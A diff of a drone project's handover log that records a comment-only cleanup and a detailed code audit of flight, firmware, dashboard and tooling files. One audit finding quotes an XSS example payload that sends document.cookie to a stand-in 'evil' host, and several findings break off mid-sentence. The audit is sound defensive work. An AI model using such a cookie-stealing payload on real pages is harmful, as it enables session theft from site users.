@@ -2501,3 +2501,266 @@ DANGLING, not fixed because it is a runtime string and not a comment:
 NOTE FOR WHOEVER READS THIS NEXT: `HANDOVER.md` still says "SUBMISSION IS
 2026-08-23". Today is 2026-08-24. Not edited, because whether it went in is not
 recorded anywhere and guessing is worse than a stale line. ASK THE USER.
+
+### 2026-08-24 ~14:10 IST: CODE COMMENTS HUMANIZED, uno_q/ + tools/, ZERO CODE TOUCHED
+
+37 Python files, 676 insertions and 585 deletions, ALL of it comment and
+docstring text. Five Sonnet agents, one per subsystem, each told the same thing:
+delete comments that restate the line below, keep and tighten the ones carrying
+why-not-the-obvious-thing and what-broke-last-time, unify voice, vary sentence
+length, no em-dashes, no ALL-CAPS emphasis, no decorative `# ---- x ----` rules,
+and never paraphrase a measurement or a parameter name.
+
+PROOF IT IS COMMENT-ONLY, not a claim: every file was parsed before and after,
+docstring nodes deleted from both trees, and the dumps compared. **37 of 37
+identical.** Comments never reach the AST at all, so an identical dump means the
+executable program is the same logic. Script in the session scratchpad; rerun it
+against any ref if this ever needs re-proving. All 37 compile, and
+`test_camera_geom.py` passes its 24 geometry checks.
+
+WHAT ACTUALLY CHANGED: almost nothing was deleted. Across all five batches only
+two comments were cut outright (`tools/sik.py` and `tools/bench.py`, each
+restating the line below it). Everything else was de-shouting, un-telegraphing
+and grammar. `mission.py` took the heaviest pass, its docstring going from
+telegraph notation ("Dropout = (a) acquired then stale/invalid or (b) never
+acquired by rng_expect_m") to prose. State-name capitals were deliberately left
+alone everywhere, because `DESCEND` and `SURVEY` are literal `self.state` string
+values and not emphasis.
+
+TWO STALE COMMENTS FIXED (comments, so still no code change):
+- `mission.py` module docstring said "blind for the first 15m of a descent is
+  normal". That was the 15 m survey. Rewritten onto the sensor's own 8 m limit,
+  which stays true whatever the altitude of the day, and matches how the docs
+  were already rewritten on 2026-08-24.
+- `run_mission.py:69` said "2.0, not 3.0: prevents zero descent if survey is at
+  tree line" above a flag that defaults to 1.0. Both numbers were dead.
+  Rewritten onto the constraint that actually binds: drop_alt has to stay above
+  floor_margin_m or the EKF floor abort is silently dead (see 2026-08-24 entry
+  on `_below_floor`).
+- `test_everything.py:54` pointed at FIELD_CHECKLIST, which moved to the
+  gitignored `field_ops/`. Repointed at docs/README.md.
+
+TWO DISCREPANCIES FOUND AND DELIBERATELY NOT TOUCHED, because neither can be
+verified from source alone:
+- **SERVO PWM NUMBERS DISAGREE BETWEEN TWO FILES.** `mavlink_io.py` comments
+  carry 560/1760, `dropper.py` carries 500/1600. One is stale. The gate
+  endpoints were changed to 560/1760 at some point, so 500/1600 is the likely
+  stale pair, but that is inference and not a bench reading. CHECK ON THE BENCH.
+- `bench_models.py` cross-references "detector.OnnxDetector.poll's
+  preprocessing", which actually lives in `infer_rows`. Left as found.
+
+PROCESS NOTE: one agent ran read-only `git show`/`git status` despite being told
+not to run git. Read-only, nothing written, and it self-reported rather than
+hiding it. Recorded because agent instructions that get ignored are worth
+knowing about before the next fan-out.
+
+### 2026-08-24 ~13:15 IST: FULL CODE-ONLY AUDIT OF THE WHOLE REPO (user-requested; analysis only, NOTHING FIXED)
+
+Scope per the user: "the entire codebase (only the code), any issues no matter
+how small". 14,659 lines across 57 tracked source files (py / sh / html /
+ino / cpp / h), excluding .venv, .pio and site-packages. Method: 9 Sonnet
+finder agents, one per subsystem slice, each reading its files in full, then
+4 Sonnet adversarial verifiers re-reading the cited code and told to default
+to REFUTED when unsure. 78 raw findings -> 73 confirmed, 5 refuted. Plus my
+own static passes on this laptop (below). This is the SECOND audit today; the
+~12:20 one covered the flight path, this one covers tools/, the ESP32
+firmware, the frontend, training/ and the shell scripts as well.
+
+MY OWN MECHANICAL PASSES, all clean, recorded so they are not repeated:
+- Custom AST undefined-name checker over all 45 tracked .py files: ZERO hits.
+  This is the check that would have caught this morning's `MOUNT_YAW_DEG`
+  NameError, which py_compile could not. Worth keeping: no pyflakes/ruff is
+  installed, the script is 80 lines of `ast`, and it runs in under a second.
+- py_compile on all 45: clean. `bash -n` on all 4 shell scripts: clean.
+- No bare `except:` anywhere. No log opened in 'w' mode; every log writer
+  appends. Every unattended board program (dashboard, detect_worker,
+  run_mission, test_everything) uses BoardLog; the library modules take a
+  `log=` seam, which is correct.
+- Frontend/Flask route sets match EXACTLY: all 21 `/api/` paths referenced in
+  index.html exist as routes, and no route is orphaned. POST/GET methods agree.
+- Dashboard path-traversal surface is genuinely guarded (regex + basename +
+  send_from_directory). No shell=True anywhere. wifi.py keeps passwords out
+  of argv. Tile z/x/y vs ESRI z/y/x convention is correct in both directions.
+- `uno_q/test_camera_geom.py` PASSES (20 assertions).
+- Verified BY EXECUTION that this morning's geometry numbers are right:
+  footprint_track_m(5) = (3.003 across, 5.340 along), spacing_for_overlap(5,1)
+  = (2.003, 4.340). The code is correct; see the test-coverage gap below.
+
+FOUND BY ME, NOT BY THE AGENTS (cross-file drift the per-slice readers could
+not see, each verified in source or by running it):
+- **`footprint_track_m()` and `spacing_for_overlap()` HAVE NO TEST COVERAGE.**
+  This morning's entry says "GEOMETRY REBUILT ON THAT FACT (all asserted by
+  unit test)". test_camera_geom.py imports only CameraGeometry, calibrate_fov,
+  camera_to_ned and letterbox_to_frame; it never imports either new function,
+  and test_everything.py has no geometry section. The numbers ARE right (I ran
+  them, above), but nothing in the repo would catch a regression in the one
+  function that decides survey row spacing. Correcting the earlier claim here
+  per truth rule 8.
+- `run_mission.py:131` and `calibrate_camera.py:119` print `geom.footprint_m()`
+  as a "ground footprint W x H". footprint_m is AXIS-labelled (1280 axis first);
+  with MOUNT_YAW_DEG=90 that prints 5.3 x 3.0 at 5 m, which an operator reads as
+  5.3 m side-to-side when across-track is actually 3.0. footprint_track_m()
+  exists precisely for this and is used only in make_waypoints.py. Display only,
+  nothing computes from it, but it is the pre-flight line the operator reads.
+- `camera_geom.py:30-34`: the module docstring still says "Until it is measured,
+  DEFAULT_HFOV_DEG is a placeholder", contradicted five lines later by the
+  MEASURED comment at 39-46. The 2026-08-15 fix cleared the constant's comment
+  and missed the docstring. Same file, lines 27-28 and 42-45 still reason at a
+  15 m survey.
+- `camera_geom.py:64`: footprint_track_m decides "rotated" by
+  `abs(sin(yaw)) > 0.5`, a cliff at 30 deg. I ran it: yaw 45 returns a hard
+  axis swap (3.003, 5.340) though a 45 deg mount has a diamond footprint, and
+  yaw 29 returns unswapped. Nothing validates that the yaw is axis-aligned.
+  Harmless at the only two values used (0, 90); a trap if anyone tilts the mount.
+- `camera_to_ned(..., mount_yaw_deg=0.0)` and `OnnxDetector(..., mount_yaw_deg=0.0)`
+  default to 0 while `MOUNT_YAW_DEG` is 90. The flight path passes the flag
+  explicitly, so this is latent, but it is the same shape as this morning's
+  NameError: the single home exists and the defaults do not point at it.
+- STALE TODO CROSS-REFERENCES from the 2026-08-02 renumbering:
+  `camera_geom.py:1` says "(TODO 11)" but TODO 11 is now the SITL dropout
+  drill; `predict.py:1` says "(TODO 14)" but TODO 14 is now Calibrations.
+  (`find_pixhawk_uart.py` / `sketch_serial1_probe.ino` "TODO 7" and
+  `config.h:58` "TODO 4" are both still correct.)
+- `mission.py:96` comment: "Camera swath 16 m @ 15 m altitude (8 m either
+  side)". At the 5 m survey across-track is 3.0 m. The fence-margin reasoning
+  in that comment is built on the stale figure. `mission.py:17-19` docstring
+  likewise still says "first 15m descent blind-normal".
+- `gen_fake_mission.py:36`: `SURVEY_ALT, DROP_ALT = 15.0, 3.0`, stale against
+  5.0 / 1.0. Fake data only, but it feeds the dashboard's altitude-profile
+  panel, so the demo data no longer resembles a real flight.
+- `calibrate_camera.py:91`: `--survey-alt` still defaults to 15.0.
+- Unused imports: `uno_q/sitl_test.py:25` (mavutil), `uno_q/calibrate_camera.py:44`
+  (math). Both confirmed unreferenced. (tools/wiring_check.py's two are
+  deliberate re-exports carrying `# noqa: F401`; not a finding.)
+- `PIXHAWK_TOOLS` (dashboard.py:36) is wrong in BOTH directions: it omits
+  fence.py (which opens MavIO at fence.py:294) AND servo_jog.py, flow_test.py,
+  esp32_mute.py, ring_channels.py (all call mavlink_link.connect()), while it
+  INCLUDES check_log.py, which only parses a .bin file and never touches the
+  serial port. servo_jog and ring_channels are board-run per CLAUDE.md, so the
+  gap is reachable by the documented workflow.
+- `tools/check_log.py:283` compares `volt_min == 0.0` (float equality on a
+  sentinel). Works because an unconfigured monitor logs exactly 0, but it is
+  the one float `==` in the repo. `make_waypoints.py:83`'s `dx == 0.0 and
+  dy == 0.0` is a correct degenerate-segment guard, NOT a finding.
+- Shell: `board_setup.sh`, `diag_dashboard.sh`, `start_dashboard.sh` set
+  neither `-e` nor `-u`; only `stop_dashboard.sh` sets `-u`.
+
+AGENT FINDINGS, VERIFIED (73 confirmed, severity as re-graded by the verify pass):
+
+**CRITICAL**
+- `uno_q/mavlink_io.py:392` arm() can never return False; command_ack() has no failure-return path, only True or an exception. uno_q/mission.py:252 does `if not io.arm(retries=cfg.arm_retries):` expecting a normal False on refusal, then extracts prearm reasons and sets a NOARM state (mission.py:253-255) so the run ends gracefully with a logged cause. Since arm() can never actually return False, that whole branch is dead code. A real arming refusal (e.g. ArduPilot answering MAV_RESULT_DENIED, or prearm checks still failing
+
+**HIGH**
+- `esp32_obstacle_avoidance/proximity_sensors.cpp:209` Per-channel retry loop still fires during whole-bus-down between bus-clear attempts. Mux or bus fault that takes down every fitted channel at once (e.g. a device stuck mid-transaction holding SDA low, the scenario busClear() exists for). Every 5 s, maintain() picks one fitted channel via round-robin and calls initChannel(), which per config.h's own measurement blocks ~1 s waiting for I2C timeouts on a bus that busClear() has not yet been allowed to fix. That is a ~1 s MAVLink-stre
+- `tools/level_cal.py:59` is_armed() reads any HEARTBEAT, not just the autopilot's, so ESP32 traffic can fake 'disarmed'. If the ESP32 is plugged in (it heartbeats independently of any data-stream request) and its HEARTBEAT happens to be the next one recv_match() returns, is_armed() reads the ESP32's base_mode instead of the Pixhawk's. An onboard-controller heartbeat never sets MAV_MODE_FLAG_SAFETY_ARMED, so `bool(hb.base_mode & ARMED_BIT)` is False regardless of whether the aircraft is actually armed. The script the
+- `uno_q/basestation/static/index.html:1870` Abort reason (and other event fields) injected into the map tooltip via innerHTML without escaping. Any abort-reason string (or aircraft state string at line 1942, `f.state`) that contains HTML/script, e.g. `<img src=x onerror=fetch('//evil/'+document.cookie)>`, gets parsed and executed in the operator's browser the moment their mouse hovers the abort marker on the map, because it goes through innerHTML with no sanitization.
+- `uno_q/detect_worker.py:160` Manual photo save only catches OSError, not cv2.error, unlike the main photo-save path. If `cv2.imwrite` raises `cv2.error` (e.g. because the externally-supplied target_dir from finding above produces a bad/unwritable path), the exception is not caught anywhere and kills the entire `while True` loop in `main()`, terminating detect_worker.py and ending all puddle detection for the rest of the flight because of one bad manual-photo request.
+- `uno_q/fence.py:271` Fence read-back silently returns a truncated corner list if a MISSION_ITEM_INT reply is lost. push() uploads 7 corners and gets MISSION_ACK ACCEPTED; the dashboard then calls read_back() to prove the upload landed. If one MISSION_ITEM_INT reply is lost on the link (the file's own comments describe this link as sharing bandwidth with a 10 Hz proximity stream and already flaky), read_back() silently returns e.g. 3 of 7 corners as if that were the complete, confirmed fence -- with no exceptio
+- `uno_q/mission.py:245` GUIDED mode-set result is logged but never gates arming/takeoff. If DO_SET_MODE to GUIDED is refused or simply not confirmed within `mavlink_io.set_mode`'s 5s heartbeat window (e.g. an EKF/prearm-related mode-change rejection, or a stale/slow link), the mission still arms and 'takes off' while every subsequent state handler drives the aircraft exclusively through GUIDED-only commands (`io.goto`, `io.velocity_ned`). Those commands may be silently ignored by the 
+- `uno_q/test_everything.py:122` mission-clash refusal is reported but silently discarded. A mission is running, the operator (or the dashboard's 'Test everything'/'Check arming' button) launches test_everything.py. mission_running() correctly detects the clash, but the report() call returns immediately without appending to `results` and without calling `log.info`/`log.error` (line 109-110 never executes). `_finish()` then writes `results: []`, and since `fails = sum(...) == 0`, `ok_all
+
+**MEDIUM**
+- `esp32_obstacle_avoidance/proximity_sensors.cpp:109` Fake-sensor mode ignores RING_SENSOR_FITTED/UP_SENSOR_FITTED, reporting unfitted channels as clear instead of unknown. Flash with USE_FAKE_SENSORS=1 to bench-validate that unfitted/failed sectors correctly show up as 'unknown' before flight: channels 1 and 2 (unfitted per config.h) will instead be transmitted to the Pixhawk, and printed on the debug serial as classifyCm() == SECTOR_NO_OBSTACLE, as CLEAR rather than the ERR/unknown state the real hardware path and the design commentary both require. Anyone using fa
+- `tools/flow_test.py:56` Gate-open interval measured with time.time() (wall clock) instead of time.monotonic(). If the system clock is adjusted (NTP correction, manual clock fix, a laptop resuming from sleep with a stale RTC) between t0 and the second time.time() call — plausible during a multi-dwell, multi-repeat bench session that can run several minutes with pauses for input() prompts — `actual` for that cycle becomes negative or wildly inflated. That corrupts the g/s figure recorded for that dwell, skew
+- `tools/mavlink_link.py:61` require_port() only recognizes tcp:/udp:/tcpin: prefixes, rejecting valid udpin:/udpout:/tcpout: connection strings. Running any tool in this slice against SITL with, e.g., `--conn udpin:127.0.0.1:14550`, falls through to `os.path.exists('udpin:127.0.0.1:14550')`, which is False, so require_port() calls `sys.exit()` with 'udpin:127.0.0.1:14550 does not exist... NO serial devices at all' even though the connection string is completely valid and SITL is listening.
+- `tools/parameters.py:95` write_param() uses a fixed 2.0s ack timeout regardless of link speed, inconsistent with the rest of the file and the rest of the codebase. Running `parameters.py set` or `push` over the SiK radio (e.g. `--conn /dev/ttyUSB0 --baud 57600`), a legitimate write whose echo simply arrives slower than 2s across 3 attempts (6s total) is reported as 'NO ECHO' or 'REFUSED OR CLAMPED' and the process exits 1, even though the board accepted the value and would have echoed it back given the ~12s the rest of the codebase allows for radio links.
+- `tools/sik_config.py:47` BAUDS candidate list diverged from sik.py's — one tool cannot find radios the other can. A radio previously left at SERIAL_SPEED=230400 (by a prior sik.py session, or by firmware default) is found instantly by `tools/sik.py probe`. Running `tools/sik_config.py` against the same radio scans every baud in its own list, finds none, and exits with 'No radio answered on any port at any speed... Check power, the USB cable...' — a false diagnosis pointing at hardware when the actual cause is
+- `tools/wiring_check.py:96` wiring_check.py reimplements connect()/request_streams() instead of calling them. The two rate formulas are currently mathematically equivalent (De Morgan's flip), but they are independently maintained magic-number thresholds; a future change to the SiK-vs-USB baud cutoff or to request_streams()'s stream rate in mavlink_link.py will not propagate here, silently reintroducing the exact 'two copies of the link logic drift apart' failure mode the project already paid for once.
+- `training/val_compare.py:34` val_compare.py uses batch=16, the exact setting train.py's own docstring says OOM-killed this laptop twice. Running val_compare.py (which loads two models and validates both, per its own comment 'GPU: needs the GPU free') with the same batch=16 that already caused two kernel OOM kills during training risks the identical OOM kill mid-comparison, especially if other apps are still open.
+- `uno_q/basestation/dashboard.py:36` PIXHAWK_TOOLS omits fence.py, which also opens the Pixhawk port exclusively. If a user runs 'python fence.py push' or 'fence.py read' by hand on the board (fence.py's own docstring at lines 30-34 documents this CLI usage) while the dashboard process is up, port_owner() reports no busy tool, so a concurrent /api/live_position poll or /api/fence/push request will try to open the same serial port that fence.py's CLI process already holds exclusively, producing a busy-port fai
+- `uno_q/basestation/dashboard.py:207` /api/layout POST writes to disk even when the server was started without --enable-control. A base station started without --enable-control (the documented 'read-only' mode, and per CLAUDE.md the mode exposed publicly via https://drone.reysen.net through cloudflared) still accepts unauthenticated POST /api/layout requests up to 100 KB of arbitrary JSON, which get atomically written over layout.json (lines 211-215). Any visitor to the public read-only dashboard can silently overwrite the 
+- `uno_q/basestation/dashboard.py:267` live['io'] closed/nulled from other request threads without holding live['lock']. The map poller (GET /api/live_position, called every 3 s per its own docstring) is mid-poll and holding the lock while stepping io; concurrently the operator clicks Start, hitting POST /api/control/start on another thread. api_start calls live_release(30, 'mission starting') which calls live_close() unguarded: it sets live['io']=None and closes the connection object that the poller thread is still
+- `uno_q/basestation/dashboard.py:616` Manual-photo worker handshake has no locking across concurrent requests. Two overlapping POST /api/control/photo requests (e.g. a double-click, or two open dashboard tabs) each remove the other's in-flight MANUAL_DONE and overwrite MANUAL_REQ with their own manual_dir before the worker has answered the first one. The worker only takes one photo and writes one MANUAL_DONE reply; both HTTP handler threads then read that same single reply file, so one caller is told about
+- `uno_q/basestation/static/index.html:804` loadWaypoints() and loadFence() clobber each other's wpDirty flag. Enter route-edit mode (Edit route), drag/add a waypoint so state.wpDirty=true and the Save button becomes enabled. Before saving, either click the header 'refresh' button or let the 15s auto-poll notice a new mission (both call reload()). loadWaypoints() correctly leaves state.wps untouched (edit.mode is 'route'), but loadFence() runs its `if (edit.mode !== 'fence')` branch (true, since mode is 'r
+- `uno_q/basestation/static/index.html:1123` ctlPost() fetches have no timeout, so control buttons can hang forever. If the board becomes unreachable mid-request (weak field Wi-Fi, board reboot, board switching networks) without the TCP connection resetting promptly, the fetch promise can stay pending indefinitely. The calling button (e.g. 'capturing…', 'connecting…', 'planning…') stays disabled with no way for the operator to retry short of reloading the whole dashboard.
+- `uno_q/basestation/static/index.html:1170` Self-test progress bar hide-timeout is never cancelled, can hide a newly-started run. Finish a self-test run (bar reaches 100%, the 400 ms hide timer is scheduled), then immediately click 'Test everything' or 'Check arming' again before the 400 ms elapses. The new run's progress bar is shown, but the leftover timeout still fires and forcibly sets `bar.style.display='none'; fill.style.width='0'` mid-run, so the bar disappears/resets while $('stNote') keeps showing real progress (e.g
+- `uno_q/calibrate_camera.py:56` FOV calibration grabs by bare /dev/videoN index, bypassing the by-name resolver camera.py exists to enforce. If node numbering has shifted on that boot (a documented, observed occurrence on this exact board), `--grab N` can silently open a Venus codec node instead of the camera, or capture a stale buffered/out-of-focus frame from the correct camera during warm-up, and the operator measures FOV from that image without any diagnostic telling them it's wrong -- undermining the one number (HFOV) the file's o
+- `uno_q/detect_worker.py:150` Manual-photo target directory taken from a world-writable tmp file with no path validation. Any local process/user able to write that tmp file (the file's own contract is just 'content is the target directory') can make detect_worker.py create arbitrary directories and drop a JPEG anywhere its OS user can write, e.g. `../../some/other/path` or an absolute path like `/home/user/.ssh`, purely by writing one line to a world-writable file.
+- `uno_q/detect_worker.py:261` Cap-enforcement re-trigger is gated behind successful saves, so it stops exactly when disk fills. Once `cv2.imwrite` starts failing on every frame (e.g. eMMC actually full for any reason), `photos_since_check` never advances again, so `enforce_cap()` never runs again to reclaim space. The failure mode that most needs the cap enforcement to recover is the exact one that permanently disables it until the worker process is manually restarted.
+- `uno_q/dropper.py:122` dwell_s minimum floor only applies to a per-call override, not to the constructor default; an unvalidated negative dwell_s crashes trigger() after the gate is already open. PixhawkServoDropper(io, dwell_s=-1) then .trigger() (called normally, i.e. with dwell_s=None) computes `dwell = self.dwell_s` = -1 unclamped, opens the gate (line 126-130, succeeded already incremented), then calls `self._sleep(dwell)` at line 133, i.e. `time.sleep(-1)`, which raises `ValueError: sleep length must be non-negative`. That exception is uncaught and propagates out of trigger() with th
+- `uno_q/fence.py:103` validate()'s duplicate-first/last-corner check is skipped for the minimum 3-vertex case, letting a degenerate 2-point 'triangle' through. A UI flow that lets an operator draw exactly A, B, then closes back to A produces polygon [[A],[B],[A]]; validate() returns None (looks pushable); push() uploads it to the Pixhawk as a legitimate 3-corner MAV_CMD_NAV_FENCE_POLYGON_VERTEX_INCLUSION fence. The stored 'polygon' is actually a zero-area line between A and B, so AC_Fence's inside/outside polygon test can behave unpredictably (e.g. repor
+- `uno_q/mission.py:371` Detections rejected for poor GPS fix are never recorded, unlike fence-rejected detections. A puddle repeatedly detected under a persistently poor fix (e.g. under canopy) leaves zero trace anywhere in the mission JSONL — not even a 'detection' event — while a puddle rejected for being outside the fence at least appears in the log as seen-and-rejected. Post-flight review of the dashboard/log for that site would show nothing happened there at all, even though the model fired on it repeated
+- `uno_q/predict.py:57` Site centroid can drift arbitrarily far from any actual detection over many absorptions. Over many flights/detections at a site whose sightings trend gradually (e.g. a puddle whose edge is repeatedly detected from slightly different angles/positions, or noisy geolocation), the reported `s.lat, s.lon` can walk well outside the radius_m of the very first detection that created the site, while still being reported to the dashboard/CLI table as one 'persistent (likely breeding site)' at a
+- `uno_q/run_mission.py:303` Failed worker-kill is logged but a second detect_worker is spawned anyway. A detect_worker that ignores SIGTERM (e.g. blocked in a driver call) leaves two processes contending for the same camera device. On V4L2, the second process's `cv2.VideoCapture` open commonly fails or returns a device already claimed by the other process, so the freshly spawned worker can silently stop publishing detections while the mission believes a fresh, correctly-configured worker is running
+- `uno_q/start_dashboard.sh:31` pkill pattern is not anchored to this dashboard's own path. Any other python process whose argv happens to contain the substring 'dashboard.py' (a second repo checkout at a different path, a co-developer's own script with that name, a one-off `python3 -c "..." dashboard.py-backup` invocation) gets SIGTERM'd by this 'restart my dashboard' script, not just the intended base-station process.
+- `uno_q/start_dashboard.sh:34` 1s grace period plus unanchored pgrep can report 'dashboard UP' while serving stale code. If the old Flask process takes longer than 1s to actually exit and free port 8080 (busy request, slow shutdown), the freshly launched process can fail to bind the port and exit immediately with the NEW code (the exact reason this restart script exists per its own header comment, lines 12-13: 're-running after a git pull serves the NEW code instead of failing on the busy port'), yet pgrep at line 4
+- `uno_q/stop_dashboard.sh:16` same unanchored pkill pattern used for both SIGTERM and SIGKILL. An unrelated python process matching that substring is force-killed (SIGKILL, no cleanup chance) if it's still present 10s after the first signal (line 23-29 loop), or the wrong PID is reported in the log line at 21 ('SIGTERM -> PID(s) ...').
+- `uno_q/test_camera_geom.py:31` 'vfov derived' check is a tautology and can never fail. If `f_px` (and therefore the whole hfov->vfov relationship) were computed incorrectly in CameraGeometry, this assertion would still pass every time, because both sides evaluate the exact same expression on the exact same `f_px` value - it cannot detect a wrong f_px/vfov formula.
+- `uno_q/test_everything.py:155` camera handle only released on the happy path; unhandled exceptions crash the whole self-test. If any such exception fires after open_camera() succeeds, it propagates out of main() uncaught: cap.release() is skipped (camera device leaked), and the whole script dies before reaching _finish(), so selftest.json is left with `running: true` forever from the earlier `_write(..., running=True, ...)` call at line 119 - the dashboard shows the run as permanently in-progress instead of a clean failu
+- `uno_q/wifi.py:157` connect_new() skips setting wifi-sec.key-mgmt whenever a same-named profile already exists, even if that profile was never configured for a password. An operator's earlier attempt saves 'FieldWifi' without a password (open profile). Later they call connect_new('FieldWifi', <real password>) to actually join it; since the name is already in `existing`, the code never sets wifi-sec.key-mgmt on that profile and just tries to bring it up with a passwd-file supplying a PSK secret the profile isn't configured to use -- the connection attempt fails (or
+
+**LOW**
+- `esp32_obstacle_avoidance/esp32_obstacle_avoidance.ino:141` Up-sensor debug output cannot distinguish 'not fitted' from 'failed', unlike every ring sensor. If UP_SENSOR_FITTED in config.h is ever set to 0 (up sensor physically removed, mirroring how ring channels get marked unfitted), the debug log will report the up sensor as 'ERR' in printReadings() and 'up:DOWN(e0)' in the periodic health line, indistinguishable from a genuinely failed sensor, sending anyone reading the serial log chasing a hardware fault that does not exist. This does not affect 
+- `esp32_obstacle_avoidance/mavlink_proximity.cpp:54` OBSTACLE_DISTANCE time_usec is a zero-extended 32-bit micros(), which rolls over every ~71.6 minutes. On a flight (or a bench soak) running continuously past ~71.6 minutes, the OBSTACLE_DISTANCE time_usec field will jump backward at the wrap point. I have not verified from source whether ArduPilot's AP_Proximity_MAVLink backend rejects or otherwise mishandles a non-monotonic time_usec for this message (I do not have a verified source confirming its exact staleness-check behavior), so I cannot stat
+- `tools/check_log.py:97` first_fly_t is computed from the previous CTUN record's throttle, delaying it by one sample and sometimes leaving it None despite flight data existing. The record where throttle actually first crosses the gate updates `thr` (line 104) but does not itself set first_fly_t (its own check at line 97 used the still-stale prior value); first_fly_t only gets set on the NEXT CTUN record, one sample late. In a log with only a single CTUN record above the gate (short log, or gate crossed right at EOF), first_fly_t never gets set at all even though VIBE dat
+- `tools/esp32_mute.py:89` is_armed() and ring_traffic() poll deadlines use time.time() instead of time.monotonic(). A clock step during the up-to-8s is_armed() poll (or the 6s ring_traffic() listen) makes the actual wait time diverge from what the code intends: either the tool hangs noticeably longer than 8s, or it aborts with 'no autopilot heartbeat, refusing to reboot blind' / reports a misleadingly short ring_traffic() sample window even though the aircraft's heartbeat was arriving normally the whole time.
+- `tools/ring_channels.py:240` --sensor up always prints 'longest gap 0 sample(s)' regardless of actual dropout. Running `tools/ring_channels.py --sensor up` always shows 'longest gap 0 sample(s)' even during a run where the up sensor genuinely went silent for seconds at a time (that silence is tracked internally as gaps['up'] but never surfaced for this mode), giving a false impression that dropout was checked and found to be zero.
+- `tools/ring_channels.py:478` survey()'s FLAKY threshold is a separately hardcoded magic number that can drift from DROPOUT_GATE_PCT. If DROPOUT_GATE_PCT is ever changed (e.g. loosened to 10.0 to reduce false FLAKY calls in the field), --sensor mode's gate moves accordingly but survey()'s independent '95' does not, so the same channel with the same dropout percentage (e.g. 8% dropped) is reported 'alive' by --sensor and 'FLAKY' by survey in the same session, and nobody editing the one named constant would know to also fix line 4
+- `tools/wiring_check.py:108` the 57600-baud fast/slow-link threshold and its ack-timeout values are independently re-derived in three files. If the project ever changes the SiK baud rate or decides a different ack timeout is needed for radio links, it must be updated in mavlink_link.py, wiring_check.py, and servo_jog.py separately; missing one leaves that tool silently using a stale timeout, exactly the kind of drift the project's own comments (parameters.py's NEEDS_REBOOT list, mavlink_link.py's docstring) show this codebase has been 
+- `training/merge_datasets.py:108` valid/ and test/ folding into the same 'val' split can silently overwrite images with an inflated count. If a single export folder has an image with the same basename in both its valid/ and test/ subfolders (both map to 'val'), the second copy silently overwrites the first image+label pair on disk with no warning, yet counts['val'] is still incremented twice, so the final printed tally ('done: N train / M val images') overstates what's actually on disk and one image+label pair from the dataset is los
+- `uno_q/basestation/dashboard.py:401` /api/waypoints/generate validation failures return 400 without logging. An operator (or the UI) sending a malformed or out-of-range route-generation request gets a 400 response, but ~/logs/dashboard.log has no record that it happened or why -- if the field crew reports 'the generate button silently failed', the log file used for troubleshooting has nothing to show for that failure, contradicting the file's own stated logging guarantee.
+- `uno_q/basestation/dashboard.py:502` api_waypoints_generate's finally block can reference io before it is ever assigned. If 'from make_waypoints import build_serpentine' or 'from mavlink_io import MavIO' raises (e.g. an ImportError from a bad deploy), the except clause logs and returns a 500 as intended, but the finally block's io.conn.close() then raises UnboundLocalError because io was never assigned. That specific error is swallowed only because it happens to be caught by the finally's own blanket 'except Excepti
+- `uno_q/basestation/dashboard.py:641` cv2 VideoCapture not released if grab()/read() raises in the direct-capture fallback. If cap.grab()/cap.read() throws (a plausible cv2/V4L transient error), execution jumps straight to the outer except and cap.release() is never called, leaving the USB camera device handle open. A subsequent manual-photo or auto-detect open of the same camera node can then fail with a busy/in-use error until the unreleased VideoCapture object happens to be garbage-collected.
+- `uno_q/basestation/dashboard.py:726` /api/fence POST validation failures return 400 without logging. A malformed or geometrically invalid polygon submitted from the map UI is silently rejected from the dashboard's point of view: the operator sees the error in the browser, but ~/logs/dashboard.log records nothing, breaking the 'every failure reason' logging guarantee stated in the module docstring (lines 1-2) for this control action.
+- `uno_q/basestation/gen_fake_mission.py:185` '--flights 0' silently falls through to generating the default two-flight dataset. Running 'python gen_fake_mission.py --flights 0' does not generate zero flights (or error); it silently falls into the else branch and writes the curated two-flight demo dataset (flight A and flight B, lines 194-210) instead, which is not what '--flights 0' asks for.
+- `uno_q/basestation/static/index.html:754` Panel-resize column width hardcodes the grid's CSS gap/padding instead of reading them. If the #grid CSS `gap` or `padding` values are changed later (a plausible edit given the file already tunes cell height via a CSS var), this JS calculation silently goes stale: dragging a panel's resize handle will map mouse movement to the wrong number of columns, so the panel visually resizes faster or slower than the cursor, misaligned from the actual grid it is snapping to.
+- `uno_q/basestation/static/index.html:1399` state.liveErr is computed but never displayed anywhere. If /api/live_position repeatedly fails (board unreachable, Pixhawk port busy), the pre-flight 'aircraft on the ground' marker on the map simply stops updating with no error shown to the operator anywhere in the UI, even though the code already computed a human-readable reason for the failure and stored it for exactly that purpose.
+- `uno_q/basestation/static/index.html:1538` tiles.ok is not reset when tile mode switches, so the status line misattributes tile source. If some tiles already loaded successfully in 'direct' mode (tiles.ok > 0) before a failure switches to 'proxy' mode, the counter keeps accumulating across the switch, and once proxy tiles start succeeding too the status line reads e.g. 'sat: 9 tiles via board' even though several of those 9 were actually fetched directly - misleading for exactly the diagnostic purpose the comment at line 1530-1532
+- `uno_q/basestation/static/index.html:2018` Top-level function named chrome() overwrites window.chrome. Any extension or third-party script sharing this page's global scope that checks `window.chrome.runtime` (or similar) after index.html's script runs will see this page's map-chrome-drawing function instead of the native object, and calls like `window.chrome.runtime.id` will throw ('runtime is undefined') instead of behaving as expected.
+- `uno_q/basestation/static/index.html:2202` 'ly-sat' checkbox gets two separate 'change' listeners that both call render(). Toggling the 'sat' layer checkbox on triggers two full map redraws per click (once from the generic listener's plain render(), once from the specific handler's render() after resetting tiles.mode/cache) - wasted work every time, and if the specific handler's tile-cache reset logic were ever meant to run before a single deliberate render, the extra untracked render from the generic listener runs wi
+- `uno_q/boardlog.py:142` close() doesn't restore sys.stdout/stderr after capture redirect; later writes raise an uncaught ValueError. If any caller invokes `BoardLog.close()` while capture redirected the streams, any subsequent call to `log(...)`/`log.info/warn/error(...)`, or any other code doing a bare `print()` (which now targets the same closed file object via `sys.stdout`), raises an uncaught `ValueError: I/O operation on closed file`, potentially crashing whatever cleanup/logging code runs after close. No current caller in
+- `uno_q/detector.py:268` Sharpness metric is computed over the letterboxed frame including the grey padding borders. The reported sharpness number is systematically deflated relative to the true blur of the actual camera content, since a large constant-color region is baked into the variance calculation; anyone using these logged values to pick a blur threshold (the stated purpose in the surrounding comment) is calibrating against a diluted number, not the frame's real sharpness.
